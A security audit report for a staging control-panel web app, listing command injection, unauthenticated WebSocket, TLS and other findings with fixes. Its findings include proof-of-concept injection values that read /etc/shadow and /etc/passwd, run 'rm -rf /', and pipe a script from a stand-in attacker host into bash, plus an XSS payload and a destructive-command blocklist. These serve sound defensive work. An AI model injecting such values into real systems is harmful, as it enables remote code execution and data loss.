# Security Audit Report — Hermes Control Interface (HCI) Staging

**Date:** 2026-04-12
**Auditor:** David Bayendor
**Target:** `/root/projects/hci-staging` (your-domain.com:10274)
**Version:** 2.0.0
**Node:** >=20.0.0
**Scope:** Full-stack security review — backend, frontend, auth, dependencies, deployment config

---

## Executive Summary

HCI has a solid auth foundation (bcrypt, CSRF tokens, role-based access, audit logging) but has several **critical command injection vulnerabilities** and **deployment security gaps** that must be fixed before production. The app is currently bound to `0.0.0.0` without nginx reverse proxy, meaning it's exposed on plain HTTP without TLS.

**Verdict:** NOT production-ready. Needs fixes across 4 critical, 5 high, 8 medium, and 4 low severity issues.

---

## Findings Summary

| Severity | Count | Status |
|----------|-------|--------|
| CRITICAL | 4 | Must fix |
| HIGH | 5 | Must fix |
| MEDIUM | 8 | Should fix |
| LOW | 4 | Nice to fix |
| **Total** | **21** | |

---

## CRITICAL Findings

### C1: Command Injection via Profile Name [CRITICAL]

**Location:** `server.js:1422`, `server.js:1822`, `server.js:1841`, `server.js:1438-1474`

**Risk:** An authenticated user can execute arbitrary shell commands by injecting into the `profile` parameter.

```javascript
// VULNERABLE — /api/profiles/use
const result = await shell(`hermes profile use ${name}`, '10s');

// VULNERABLE — /api/config/:profile
const home = `${process.env.HOME}/.hermes/profiles/${profile}`;
const raw = await shell(`cat "${configPath}" 2>/dev/null`);

// VULNERABLE — /api/memory/:profile
shell(`cat "${memoriesDir}/MEMORY.md" 2>/dev/null`)

// VULNERABLE — /api/gateway/:profile
const svc = getGatewayServiceName(profile); // hermes-gateway-${profile}
shell(`systemctl is-active ${svc} 2>/dev/null`)
```

**Proof of concept:** A profile name like `test; cat /etc/shadow` would execute `cat /etc/shadow` after the hermes command.

**Fix:** Sanitize ALL user inputs that reach shell commands with allowlist regex:
```javascript
const name = String(req.body?.profile || '').trim();
if (!/^[a-zA-Z0-9_-]+$/.test(name)) {
  return res.status(400).json({ error: 'invalid profile name' });
}
```

**Affected endpoints:**
- `POST /api/profiles/use` (line 1422)
- `GET /api/config/:profile` (line 1822)
- `GET /api/memory/:profile` (line 1841)
- `GET /api/gateway/:profile` (line 1438)
- `POST /api/gateway/:profile/:action` (line 1459)
- `GET /api/gateway/:profile/logs` (line 1482)
- `DELETE /api/profiles/:name` (line 2053)
- `GET /api/insights/:profile/:days` (line 2068)

---

### C2: Command Injection via Session Title [CRITICAL]

**Location:** `server.js:1900`

```javascript
// VULNERABLE
const output = await shell(`hermes sessions rename ${req.params.id} "${title.replace(/\"/g, '\\\\"')}" 2>&1`);
```

**Risk:** The `title` field only escapes double quotes. Backticks, `$()`, semicolons, and pipes are not filtered. An attacker can inject:
- Title: `` `whoami` ``
- Title: `$(cat /etc/passwd)`
- Title: `test; rm -rf /`

**Fix:** Sanitize title and session ID:
```javascript
const title = String(req.body?.title || '');
if (!/^[a-zA-Z0-9 _.!?@#-]+$/.test(title)) {
  return res.status(400).json({ ok: false, error: 'invalid title' });
}
const id = req.params.id;
if (!/^[a-zA-Z0-9_.-]+$/.test(id)) {
  return res.status(400).json({ ok: false, error: 'invalid session id' });
}
```

---

### C3: Command Injection via Session Export [CRITICAL]

**Location:** `server.js:1912-1913`

```javascript
// VULNERABLE
const tmpFile = `/tmp/session-${req.params.id}.jsonl`;
const output = await shell(`hermes sessions export ${tmpFile} --session-id ${req.params.id} 2>&1`);
const data = await shell(`cat ${tmpFile} 2>/dev/null`);
```

**Risk:** Session ID from URL parameter is directly interpolated into shell commands. A session ID like `; curl attacker.com/sh | bash` would execute arbitrary code.

**Fix:** Validate session ID with allowlist regex:
```javascript
const id = req.params.id;
if (!/^[a-zA-Z0-9_.-]+$/.test(id)) {
  return res.status(400).json({ ok: false, error: 'invalid session id' });
}
```

---

### C4: Command Injection via Session Delete [CRITICAL]

**Location:** `server.js:1924`

```javascript
// VULNERABLE
const output = await shell(`hermes sessions delete ${req.params.id} 2>&1`);
```

**Risk:** Same as C3 — unsanitized session ID in shell command.

**Fix:** Same allowlist validation as C3.

---

## HIGH Findings

### H1: Server Bound to 0.0.0.0 Without TLS [HIGH]

**Location:** `server.js:2075`

```javascript
const server = app.listen(PORT, '0.0.0.0', () => { ... });
```

**Evidence:**
- `ss -tlnp` shows `0.0.0.0:10274` listening on all interfaces
- No nginx reverse proxy configured for this port
- UFW does NOT have port 10274 in allowed rules (but iptables INPUT policy is DROP with exceptions, and server is reachable externally via your-domain.com)

**Risk:** All traffic including auth cookies, CSRF tokens, and session data travels in plaintext. Anyone on the network path can intercept credentials.

**Fix:** 
1. Bind to `127.0.0.1` and use nginx reverse proxy with TLS
2. Or add TLS directly to Express (not recommended for production)

---

### H2: WebSocket Accepts Unauthenticated Connections [HIGH]

**Location:** `server.js:2091-2105`

```javascript
wss.on('connection', async (socket, req) => {
  socket.authed = isAuthed(req);
  const state = await buildDashboardState(socket.authed);
  socket.send(JSON.stringify({ type: 'snapshot', payload: state }));
```

**Risk:** Unauthenticated WebSocket connections receive a full dashboard snapshot including system info (hostname, CPU, memory, disk), session list, agent profiles, config summary, and terminal status. This is an information disclosure vulnerability.

**Fix:** Reject unauthenticated WebSocket connections:
```javascript
wss.on('connection', async (socket, req) => {
  if (!isAuthed(req)) {
    socket.close(4001, 'authentication required');
    return;
  }
```

---

### H3: No General Rate Limiting [HIGH]

**Location:** `server.js:270-283`

Only the login endpoint has rate limiting. All other endpoints (including those that execute shell commands) have no rate limiting.

**Risk:** An authenticated attacker can:
- Brute-force `hermes doctor` calls to exhaust system resources
- Spam terminal commands to overload the PTY session
- Rapidly enumerate files via `/api/file`

**Fix:** Add general API rate limiter:
```javascript
const apiLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,
  max: 100,
  keyGenerator: getClientIp,
});
app.use('/api/', apiLimiter);
```

---

### H4: Session Token Stored In-Memory Map Without Server-Side Validation [HIGH]

**Location:** `server.js:1050-1071`

```javascript
const tokenToUser = new Map();
```

**Risk:**
- Server restart invalidates all sessions (expected behavior)
- No token revocation mechanism beyond manual map cleanup
- `tokenToUser` grows unbounded if cleanup threshold (100 tokens) is too high
- No per-user session limit — a user can create unlimited sessions

**Fix:** Add per-user session limit and periodic cleanup timer.

---

### H5: No Account Lockout Mechanism [HIGH]

**Location:** `server.js:1143-1167`

**Risk:** Rate limiting is IP-based only. An attacker can:
- Rotate IPs to bypass rate limit
- Attempt slow brute-force (4 attempts per 15 min per IP) indefinitely
- No notification to admin about repeated failed attempts

**Fix:** Add per-account lockout after N failed attempts:
```javascript
// In auth.js — track failed attempts per username
const failedAttempts = new Map();
const MAX_ATTEMPTS = 5;
const LOCKOUT_MS = 30 * 60 * 1000; // 30 min
```

---

## MEDIUM Findings

### M1: `unsafe-inline` in CSP Defeats XSS Protection [MEDIUM]

**Location:** `server.js:82-83`

```javascript
scriptSrc: ["'self'", "'unsafe-inline'"],
scriptSrcAttr: ["'unsafe-inline'"],
```

**Risk:** CSP with `unsafe-inline` for scripts allows any injected script to execute. The CSP provides no real XSS protection.

**Fix (long-term):** Refactor inline handlers to use event delegation, then remove `unsafe-inline`. Use nonces or hashes.

---

### M2: Frontend innerHTML with User-Controlled Data [MEDIUM]

**Location:** `src/js/main.js` — 60+ instances of `innerHTML`

**Risk:** API responses (error messages, session titles, profile names, system data) are rendered via innerHTML template literals. If any backend data contains HTML/JS (e.g., a malicious session title), it's rendered as HTML.

**Example:**
```javascript
// main.js:316 — error message rendered as HTML
document.getElementById('home-cards').innerHTML = `<div class="error-msg">${e.message}</div>`;
```

If `e.message` contains `<img src=x onerror=alert(1)>`, it executes.

**Fix:** Use `textContent` for data, or sanitize with DOMPurify:
```javascript
el.textContent = e.message; // safe
```

---

### M3: Full Error Messages Leaked to Frontend [MEDIUM]

**Location:** Multiple endpoints in `server.js`

```javascript
res.json({ ok: false, error: e.message }); // exposes stack traces
```

**Risk:** Error messages may contain file paths, function names, or system details useful for reconnaissance.

**Fix:** Return generic error messages in production, log details server-side only.

---

### M4: No `Secure` Flag on Auth Cookie [MEDIUM]

**Location:** `server.js:254, 1135, 1163`

```javascript
res.setHeader('Set-Cookie', `${AUTH_COOKIE}=...; HttpOnly; SameSite=Lax; Path=/; Max-Age=...`);
```

**Risk:** Without `Secure` flag, the cookie is sent over HTTP connections. On a non-TLS setup (current staging), this is acceptable, but for production with TLS, it's mandatory.

**Fix:** Add `Secure` flag when behind TLS proxy:
```javascript
; Secure; HttpOnly; SameSite=Lax
```

---

### M5: No HSTS Header [MEDIUM]

**Location:** `server.js:90`

```javascript
hsts: false,
```

**Risk:** Browsers don't enforce HTTPS, allowing downgrade attacks.

**Fix:** Enable HSTS in production:
```javascript
hsts: { maxAge: 31536000, includeSubDomains: true, preload: true }
```

---

### M6: System Info Exposed to Unauthenticated Users [MEDIUM]

**Location:** `server.js:1029-1037`

```javascript
app.get('/api/session', (req, res) => {
  const response = { authenticated: authed, passwordRequired: true, identity: 'root@hermes' };
```

**Risk:** `/api/session`, `/api/auth/status`, and `/api/health` reveal server identity ("root@hermes"), user count, and application details without authentication.

**Fix:** Minimize information in public endpoints.

---

### M7: Terminal Exec Endpoint Allows Unrestricted Commands [MEDIUM]

**Location:** `server.js:1539-1575`

**Risk:** The `/api/terminal/exec` endpoint (CSRF-protected, authed) allows any command execution. While intentional, there's no command allowlist or dangerous-command blocking.

**Fix:** Consider blocking dangerous commands:
```javascript
const BLOCKED = ['rm -rf /', 'mkfs', 'dd if=', 'shutdown', 'reboot'];
if (BLOCKED.some(b => command.includes(b))) {
  return res.status(403).json({ error: 'command blocked' });
}
```

---

### M8: JSON Body Limit Too High [MEDIUM]

**Location:** `server.js:93`

```javascript
app.use(express.json({ limit: '10mb' }));
```

**Risk:** 10MB JSON body limit allows large payload DoS attacks.

**Fix:** Reduce to reasonable limit (1MB for normal API, keep 10MB only for avatar upload endpoint).

---

## LOW Findings

### L1: Password Policy Too Weak [LOW]

**Location:** `server.js:1128`, `auth.js:99`

Only checks `password.length < 8`. No complexity requirements (uppercase, numbers, special chars).

**Fix:** Add complexity validation:
```javascript
if (!/(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^a-zA-Z0-9])/.test(password)) {
  return res.status(400).json({ error: 'Password must include uppercase, lowercase, number, and special character' });
}
```

---

### L2: Audit Log Grows Unbounded [LOW]

**Location:** `auth.js:141`

`fs.appendFileSync` to `hci-audit.log` with no rotation or size limit.

**Fix:** Add log rotation (10MB max, rotate to `.1`).

---

### L3: `first_run` Endpoint Reveals User Count [LOW]

**Location:** `server.js:1113`

```javascript
res.json({ ok: true, first_run: users.length === 0, user_count: users.length });
```

**Risk:** Tells attackers exactly how many users exist.

**Fix:** Only return `first_run: true/false`, omit `user_count`.

---

### L4: `parseCookies` Doesn't Handle Cookie Injection [LOW]

**Location:** `server.js:225-235`

If a cookie header contains duplicate keys (e.g., `auth=x; auth=y`), the last value wins. Not directly exploitable but could cause logic issues.

---

## Deployment & Infrastructure

### D1: No TLS Termination [HIGH — covered in H1]

### D2: Firewall — Port 10274 Not Explicitly Allowed but Reachable [MEDIUM]

UFW doesn't list port 10274, but the server is reachable externally. This suggests either:
- iptables rules before UFW are allowing it
- The server is behind a cloud provider's network firewall
- Or the port is reachable within the internal network only

**Fix:** Explicitly block 10274 externally and only expose through nginx on 443.

### D3: `.env` Contains Real Secrets [LOW]

The `.env` file has `HERMES_CONTROL_SECRET=stagin...ting`. While gitignored, if the server is compromised, the secret is in plaintext.

**Fix:** Use environment variables from systemd or a secrets manager in production.

### D4: Dependencies [INFO]

- `express@4.22.1` — current, but Express 5.x is available
- `bcrypt@^6.0.0` — current
- `helmet@^8.1.0` — current
- `ws@^8.18.0` — current
- `node-pty@^1.1.0` — native module, check for CVEs periodically

**Note:** `npm audit` could not be run (npm not in PATH). Run manually before production.

---

## Recommended Fixes (Priority Order)

### Phase 1: Critical (do immediately)

1. **Sanitize ALL shell inputs** — add allowlist regex to every endpoint that passes user data to `shell()`
2. **Bind to 127.0.0.1** — set up nginx reverse proxy with TLS (Let's Encrypt)
3. **Reject unauthenticated WebSocket** — close socket before sending any data
4. **Sanitize session rename/export/delete** — validate session ID with regex

### Phase 2: High (before production)

5. **Add general API rate limiting** — 100 req/min per IP
6. **Add per-account lockout** — 5 failed attempts → 30 min lock
7. **Add Secure flag to cookies** — after TLS is set up
8. **Enable HSTS** — after TLS is set up

### Phase 3: Medium (production hardening)

9. **Replace innerHTML with textContent** — for all dynamic data
10. **Sanitize error messages** — generic user-facing, detailed server-side logging
11. **Remove `unsafe-inline` from CSP** — refactor to event delegation
12. **Reduce JSON body limit** — 1MB default, 10MB only for avatar upload
13. **Add command allowlist or blocklist** for terminal

### Phase 4: Low (polish)

14. **Enforce password complexity** — uppercase + lowercase + number + special
15. **Add audit log rotation** — 10MB max
16. **Remove user_count from first_run endpoint**
17. **Set up npm audit in CI/CD**

---

## Code Changes Required (Quick Reference)

### Fix C1-C4: Input Sanitization Helper

Add to `server.js`:
```javascript
function sanitizeProfileName(name) {
  const s = String(name || '').trim();
  if (!/^[a-zA-Z0-9_-]+$/.test(s)) return null;
  return s;
}

function sanitizeSessionId(id) {
  const s = String(id || '').trim();
  if (!/^[a-zA-Z0-9_.-]+$/.test(s)) return null;
  return s;
}

function sanitizeTitle(title) {
  const s = String(title || '').trim();
  if (s.length > 200) return null;
  if (!/^[a-zA-Z0-9 _!?@#.()\-]+$/u.test(s)) return null;
  return s;
}
```

Then use in every endpoint that passes user input to `shell()`.

### Fix H2: WebSocket Auth Gate

```javascript
wss.on('connection', async (socket, req) => {
  if (!isAuthed(req)) {
    socket.close(4001, 'authentication required');
    return;
  }
  // ... rest of handler
});
```

### Fix H3: General Rate Limiter

```javascript
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 120,
  keyGenerator: getClientIp,
  message: { ok: false, error: 'too many requests' },
});
app.use('/api/', apiLimiter);
```

---

## Conclusion

HCI has good bones — bcrypt auth, CSRF protection, role-based access, audit logging. But the command injection vulnerabilities (C1-C4) are showstoppers. Anyone with a viewer account can escalate to full shell access via profile name or session title injection.

**Minimum for production:** Fix C1-C4 + H1-H2. Then M1-M3 for hardening.

**Estimated fix time:** Phase 1 (critical) = 2-3 hours. Phase 2 (high) = 1-2 hours. Full hardening = 1-2 days.

---

*Report generated by David Bayendor — 2026-04-12*
